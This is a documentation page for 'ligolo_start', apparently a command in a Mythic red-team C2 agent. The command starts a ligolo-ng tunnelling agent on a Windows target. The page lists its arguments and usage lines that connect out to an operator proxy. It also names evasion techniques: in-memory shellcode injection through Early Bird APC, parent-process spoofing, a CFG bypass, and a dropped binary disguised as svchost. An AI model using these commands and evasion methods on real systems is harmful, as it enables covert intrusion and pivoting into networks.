+++
title = "ligolo_start"
chapter = false
weight = 5
+++

## Summary
Start a ligolo-ng agent session. Two modes available:

- **Fork+Run** (default): Donut shellcode generated at task time, downloaded by agent, injected via Early Bird APC. No disk write. Uses bundled `binaries/agent.exe` or a custom binary.
- **Disk-drop**: PE downloaded from Mythic, written to `remote_path`, executed via `CreateProcessW`. Uses bundled `binaries/agent.exe` or a custom binary.

## Arguments
| Name | Required | Description |
|------|----------|-------------|
| `connect` | Yes* | Proxy address: `host:port` or `ws://host:port` |
| `bind` | Yes* | Bind to `ip:port` instead of connecting out |
| `remote_path` | No | Drop path on target - disk-drop only (default: `C:\Windows\Temp\svchost32.exe`) |
| `ignore_cert` | No | Ignore TLS certificate (default: true) |
| `retry` | No | Auto-retry on disconnect (default: true) |
| `accept_fingerprint` | No | Accept cert by SHA256 fingerprint |
| `proxy` | No | Upstream proxy URL |
| `user_agent` | No | Custom HTTP User-Agent |
| `verbose` | No | Verbose output (default: false) |
| `fork_run` | No | Inject in-memory via Early Bird APC (default: true) |
| `push_mode` | No | Send shellcode in a single chunk (default: false - multi-chunk pull) |
| `chunk_size_mb` | No | Chunk size in MB (default: 4) |
| `binary` | No | Custom ligolo-ng agent.exe. If omitted, uses bundled `binaries/agent.exe`. |

\* One of `connect` or `bind` is required.

## Usage

**Fork+Run (in-memory, no disk write) - default:**
```
ligolo_start -Connect 10.10.10.1:11601
```

**Disk-drop:**
```
ligolo_start -ForkRun false -Connect 10.10.10.1:11601
```

**Disk-drop with custom path:**
```
ligolo_start -ForkRun false -Connect 10.10.10.1:11601 -RemotePath C:\Windows\Temp\update.exe
```

## Notes
- Fork+Run: Donut runs at task creation time. Bundled binary shellcode is cached in memory after the first task - subsequent tasks reuse cached bytes without re-running Donut.
- Fork+Run: connection args passed via `CreateProcessW lpCommandLine`, not baked into shellcode - same shellcode works for any connection string.
- Fork+Run: uses the process set by `spawnto` as host. PPID spoofed to `explorer.exe`. CFG bypassed (APC fires inside `ntdll!LdrInitializeThunk`).
- Disk-drop: PE downloaded from Mythic in chunks and written to `remote_path`.
- Sessions tracked in a linked list; use `ligolo_status` to list, `ligolo_stop` to terminate.
